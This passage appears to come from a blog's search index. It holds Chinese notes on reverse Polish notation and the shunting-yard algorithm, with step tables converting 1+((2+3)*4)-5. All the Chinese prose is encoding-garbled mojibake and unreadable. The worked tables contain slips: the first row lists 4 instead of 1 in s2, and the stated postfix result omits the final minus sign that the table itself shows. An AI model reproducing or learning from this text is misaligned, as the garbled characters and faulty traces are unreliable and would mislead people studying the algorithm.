ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p></blockquote><p>ä¸­ç¼€è¡¨è¾¾æ³•æ˜¯è‡ªç„¶è¯­è¨€çš„å†™æ³•ï¼Œå…¶æ“ä½œç¬¦åœ¨æ“ä½œæ•°çš„ä¸­é—´</p><p>å¦‚3+4</p><h3 id="åç¼€è¡¨è¾¾å¼ï¼ˆé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼‰"><a href="#åç¼€è¡¨è¾¾å¼ï¼ˆé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼‰" class="headerlink" title="åç¼€è¡¨è¾¾å¼ï¼ˆé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼‰"></a>åç¼€è¡¨è¾¾å¼ï¼ˆé€†æ³¢å…°è¡¨ç¤ºæ³•ï¼‰</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">é€†æ³¢å…°è¡¨ç¤ºæ³• - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p></blockquote><p>å³æ‰€æœ‰æ“ä½œç¬¦åœ¨æ“ä½œæ•°çš„åé¢ã€‚</p><h5 id="æ±‚å€¼è¿‡ç¨‹"><a href="#æ±‚å€¼è¿‡ç¨‹" class="headerlink" title="æ±‚å€¼è¿‡ç¨‹"></a>æ±‚å€¼è¿‡ç¨‹</h5><ol><li>ä»å·¦åˆ°å³æ‰«æè¡¨è¾¾å¼</li><li>é‡åˆ°æ•°å­—æ—¶ï¼Œå°†æ•°å­—å‹å…¥å †æ ˆ</li><li>é‡åˆ°è¿ç®—ç¬¦æ—¶<ul><li>å¼¹å‡ºæ ˆé¡¶çš„ä¸¤ä¸ªæ•°ï¼ˆæ ˆé¡¶å’Œæ¬¡é¡¶ï¼‰ï¼Œç”¨è¿ç®—ç¬¦å¯¹å®ƒä»¬åšå¯¹åº”çš„è®¡ç®—ï¼Œå¹¶å°†ç»“æœå…¥æ ˆ</li><li>è®¡ç®—é¡ºåºæ˜¯ï¼š åå¼¹å‡ºæ¥çš„  ï¼ˆè¿ç®—ç¬¦ï¼‰  å…ˆå¼¹å‡ºæ¥çš„</li></ul></li></ol><h3 id="è°ƒåº¦åœºç®—æ³•"><a href="#è°ƒåº¦åœºç®—æ³•" class="headerlink" title="è°ƒåº¦åœºç®—æ³•"></a>è°ƒåº¦åœºç®—æ³•</h3><blockquote><p><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%BA%A6%E5%9C%BA%E7%AE%97%E6%B3%95">è°ƒåº¦åœºç®—æ³• - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></p></blockquote><p>å°†ä¸­ç¼€è¡¨è¾¾å¼è½¬åŒ–ä¸ºåç¼€è¡¨è¾¾å¼çš„ç®—æ³•ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿å¿«é€Ÿè®¡ç®—ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªæ ˆï¼šè¿ç®—ç¬¦æ ˆs1å’Œæ“ä½œæ•°æ ˆs2ã€‚æ“ä½œæ•°æ ˆå…¶å®ä¹Ÿå¯ä»¥çœ‹ä½œä¸­é—´ç»“æœæ ˆã€‚</p><p>åœ¨æ“ä½œæ•°å‹æ ˆè¿‡ç¨‹ä¸­ï¼Œç›´æ¥å…¥æ ˆå³å¯ã€‚</p><p>åœ¨è¿ç®—ç¬¦å‹æ ˆè¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¿æŒæ ˆé¡¶è¿ç®—ç¬¦ä¸ºå½“å‰ä¼˜å…ˆçº§æœ€é«˜çš„ã€‚æ¢è¨€ä¹‹å°±æ˜¯æ¯”å½“å‰æ ˆå†…è¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜çš„è¿ç®—ç¬¦å·²ç»å®Œæˆäº†è¿ç®—æ“ä½œã€‚</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2368409-20211208192029096-52314956.png" alt="img" style="zoom:67%;"><h5 id="è¯¦ç»†æ­¥éª¤ï¼š"><a href="#è¯¦ç»†æ­¥éª¤ï¼š" class="headerlink" title="è¯¦ç»†æ­¥éª¤ï¼š"></a>è¯¦ç»†æ­¥éª¤ï¼š</h5><ol><li><p>åˆå§‹åŒ–ä¸¤ä¸ªæ ˆï¼š</p><ul><li>è¿ç®—ç¬¦æ ˆï¼šs1</li><li>ä¸­é—´ç»“æœæ ˆï¼šs2</li></ul></li><li><p>ä»å·¦åˆ°å³æ‰«æä¸­ç¼€è¡¨è¾¾å¼</p></li><li><p>é‡åˆ°æ“ä½œæ•°æ—¶ï¼Œå°†å…¶å‹å…¥s2</p></li><li><p>é‡åˆ°è¿ç®—ç¬¦æ—¶</p><ul><li>æ¯”è¾ƒå®ƒå’Œs1æ ˆé¡¶è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ï¼š<ul><li>å¦‚æœs1ä¸ºç©ºæˆ–è€…æ ˆé¡¶è¿ç®—ç¬¦ç¬¦å·ä¸ºï¼ˆï¼Œåˆ™å°†å…¶å‹å…¥ç¬¦å·æ ˆs1</li><li>å¦‚æœä¼˜å…ˆçº§æ¯”æ ˆé¡¶è¿ç®—ç¬¦é«˜ï¼Œä¹Ÿå°†å…¶å‹å…¥ç¬¦å·æ ˆs1</li><li>å¦‚æœä¼˜å…ˆçº§æ¯”æ ˆé¡¶è¿ç®—ç¬¦ä½æˆ–ç›¸ç­‰ï¼Œå°†s1æ ˆé¡¶çš„è¿ç®—ç¬¦å¼¹å‡ºï¼Œå¹¶å‹å…¥åˆ°s2ä¸­ã€‚</li></ul></li><li>å†é‡å¤æ¯”è¾ƒå®ƒå’Œæ–°æ ˆé¡¶è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ã€‚</li></ul><blockquote><p>[!NOTE]</p><p>é‡å¤çš„å«ä¹‰ï¼š</p><ol><li><p>å¦‚æœs1æ ˆé¡¶å…ƒç´ ç¬¦å·ä¼˜å…ˆçº§æ¯”å½“å‰ç¬¦å·é«˜æˆ–è€…ç­‰äºï¼Œé‚£ä¹ˆå°±å°†å…¶å¼¹å‡ºå‹å…¥s2ä¸­ï¼ˆå¾ªç¯åšï¼Œåªè¦s1ä¸ä¸ºç©ºï¼‰ã€‚</p><p>å¦‚æœæ ˆé¡¶ç¬¦å·ä¸º ï¼ˆ ï¼Œå…¶ä¼˜å…ˆçº§æœ€ä½ï¼Œå°±ä¸ä¼šå¼¹å‡ºï¼Œå°±è·³å‡ºå¾ªç¯äº†ã€‚</p></li><li><p>è·³å‡ºå¾ªç¯åï¼Œåˆ™å°†å½“å‰ç¬¦å·å‹å…¥s1</p></li></ol></blockquote></li><li><p>é‡åˆ°æ‹¬å·æ—¶ï¼š</p><ul><li>å¦‚æœæ˜¯å·¦æ‹¬å·ï¼ˆ ï¼šåˆ™ç›´æ¥å‹å…¥s1</li><li>å¦‚æœæ˜¯å³æ‹¬å·  ï¼‰ï¼šåˆ™ä»¥æ­¤å¼¹å‡ºs1æ ˆé¡¶çš„è¿ç®—ç¬¦ï¼Œå¹¶å‹å…¥s2ï¼ŒçŸ¥é“é‡åˆ°å·¦æ‹¬å·ä¸ºæ­¢ï¼Œæ­¤æ—¶å°†è¿™ä¸€å¯¹æ‹¬å·ä¸¢å¼ƒã€‚</li></ul></li><li><p>é‡å¤æ­¥éª¤2~5ï¼Œç›´åˆ°è¡¨è¾¾å¼æœ€å³ç«¯ã€‚</p></li><li><p>å°†s1ä¸­çš„è¿ç®—ç¬¦ä»¥æ­¤å¼¹å‡ºå¹¶å‹å…¥ s2ã€‚</p></li><li><p>ä»¥æ­¤å¼¹å‡º s2 ä¸­çš„å…ƒç´ å¹¶è¾“å‡ºï¼Œç»“æœçš„ é€†åº å³ä¸ºï¼šä¸­ç¼€è¡¨è¾¾å¼è½¬ä¸ºåç¼€è¡¨è¾¾å¼ã€‚</p></li></ol><h5 id="ä¸¾ä¾‹ï¼š"><a href="#ä¸¾ä¾‹ï¼š" class="headerlink" title="ä¸¾ä¾‹ï¼š"></a>ä¸¾ä¾‹ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+((2+3)*4)-5</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">æ‰«æåˆ°çš„å…ƒç´ </th><th align="center">s2(æ ˆåº•-&gt;æ ˆé¡¶)</th><th align="center">s1(æ ˆåº•-&gt;æ ˆé¡¶)</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">ç©º</td><td align="center">é‡åˆ°æ“ä½œæ•°ï¼Œå‹å…¥s2</td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center">s1æ ˆä¸ºç©ºï¼Œå‹å…¥s1</td></tr><tr><td align="center">ï¼ˆ</td><td align="center">1</td><td align="center">+ï¼ˆ</td><td align="center">å·¦æ‹¬å·ï¼Œå‹å…¥s1</td></tr><tr><td align="center">ï¼ˆ</td><td align="center">1</td><td align="center">+ï¼ˆï¼ˆ</td><td align="center">å·¦æ‹¬å·ï¼Œå‹å…¥s1</td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+ï¼ˆï¼ˆ</td><td align="center">é‡åˆ°æ“ä½œæ•°ï¼Œå‹å…¥s2</td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+ï¼ˆï¼ˆ+</td><td align="center">æ ˆé¡¶ä¸ºï¼ˆï¼Œå‹å…¥s2</td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+ï¼ˆï¼ˆ+</td><td align="center">é‡åˆ°æ“ä½œæ•°ï¼Œå‹å…¥s2</td></tr><tr><td align="center">ï¼‰</td><td align="center">1 2 3 +</td><td align="center">+ï¼ˆ</td><td align="center">é‡åˆ°å³æ‹¬å·ï¼Œå¼¹å‡º+åé‡åˆ°å·¦æ‹¬å·ï¼Œåˆ é™¤ä¸€å¯¹å°æ‹¬å·</td></tr><tr><td align="center">*</td><td align="center">1 2 3 +</td><td align="center">+ï¼ˆ*</td><td align="center">é‡åˆ°æ“ä½œç¬¦ï¼Œå‹å…¥s1</td></tr><tr><td align="center">4</td><td align="center">1 2 3 + 4</td><td align="center">+ï¼ˆ*</td><td align="center">é‡åˆ°æ“ä½œæ•°ï¼Œå‹å…¥s2</td></tr><tr><td align="center">ï¼‰</td><td align="center">1 2 3 + 4 *</td><td align="center">+</td><td align="center">é‡åˆ°å³æ‹¬å·ï¼Œå¼¹å‡º*åé‡åˆ°å·¦æ‹¬å·ï¼Œåˆ é™¤ä¸€å¯¹å°æ‹¬å·</td></tr><tr><td align="center">-</td><td align="center">1 2 3 + 4 * +</td><td align="center">-</td><td align="center">é‡åˆ°æ“ä½œç¬¦ï¼Œä¼˜å…ˆçº§ç›¸ç­‰ï¼Œå¼¹å‡º+ås1ä¸ºç©ºï¼Œæ­¤æ—¶å°†-å‹å…¥ s1</td></tr><tr><td align="center">5</td><td align="center">1 2 3 + 4 * + 5</td><td align="center">-</td><td align="center">é‡åˆ°æ“ä½œæ•°ï¼Œå‹å…¥s2</td></tr><tr><td align="center">null</td><td align="center">1 2 3 + 4 * + 5 -</td><td align="center">ç©º</td><td align="center">è§£æå®Œæ¯•ï¼Œå¼¹å‡ºs1ä¸­ç¬¦å·å¹¶å‹å…¥s2ä¸­</td></tr></tbody></table><p>ç»“æœï¼š1 2 3 + 4 * + 5</p><p>è¿™æ˜¯ç†è®ºä¸Šè½¬åŒ–åç¼€ç çš„æ­¥éª¤ã€‚</p><p>ä¼˜åŒ–åçš„ç¨‹åºä¸º</p><table><thead><tr><th align="center">æ‰«æåˆ°çš„å…ƒç´ </th><th align="center">s2(æ ˆåº•-&gt;æ ˆé¡¶)</th><th align="center">s1ï¼ˆæ ˆåº•-&gt;æ ˆé¡¶ï¼‰</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">4</td><td align="center">ç©º</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1</td><td align="center">+</td><td align="center"></td></tr><tr><td align="center">ï¼ˆ</td><td align="center">1</td><td align="center">+ï¼ˆï¼ˆ</td><td align="center"></td></tr><tr><td align="center">2</td><td align="center">1 2</td><td align="center">+ï¼ˆï¼ˆ</td><td align="center"></td></tr><tr><td align="center">+</td><td align="center">1 2</td><td align="center">+ï¼ˆï¼ˆ+</td><td align="center"></td></tr><tr><td align="center">3</td><td align="center">1 2 3</td><td align="center">+ï¼ˆï¼ˆ+</td><td align="center"></td></tr><tr><td align="center">ï¼‰</td><td align="center">1 5</td><td align="center">+ï¼ˆ</td><td align="center">å°†+å‹å…¥s1ï¼Œæ¶ˆé™¤å°æ‹¬å·ï¼Œs2è®¡ç®—3 + 2</td></tr><tr><td align="center">*</td><td align="center">1 5</td><td align="center">+ï¼ˆ*</td><td align="center"></td></tr><tr><td align="center">4</td><td align="center">1 5 4</td><td align="center">+ï¼ˆ*</td><td align="center"></td></tr><tr><td align="center">ï¼‰</td><td align="center">1 20</td><td align="center">+</td><td align="center">å°†*å‹å…¥s1ï¼Œæ¶ˆé™¤å°æ‹¬å·ï¼Œæ˜¯ã€s2è®¡ç®— 4 * 5</td></tr><tr><td align="center">-</td><td align="center">21</td><td align="center">-</td><td align="center">å°†+å‹å…¥s2ï¼Œè®¡ç®—20+1</td></tr><tr><td align="center">5</td><td align="center">21 5</td><td align="center">-</td><td align="center"></td></tr><tr><td align="center">null</td><td align="center">16</td><td align="center"></td><td align="center">å°†s1å¼¹æ ˆï¼Œå‹å…¥s2</td></tr></tbody></table><p>ç»“æœä¸º16</p><p>è¿™ä¸ªè®²æ•°æ®ç»“æ„çš„ç¬”è®°æŒºå¥½çš„ï¼š <a href="https://zq99299.github.io/dsalg-tutorial/">æ•°æ®ç»“æ„ä¸ç®—æ³• ç³»åˆ—æ•™ç¨‹ï¼ˆç¬”è®°ï¼‰</a></p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
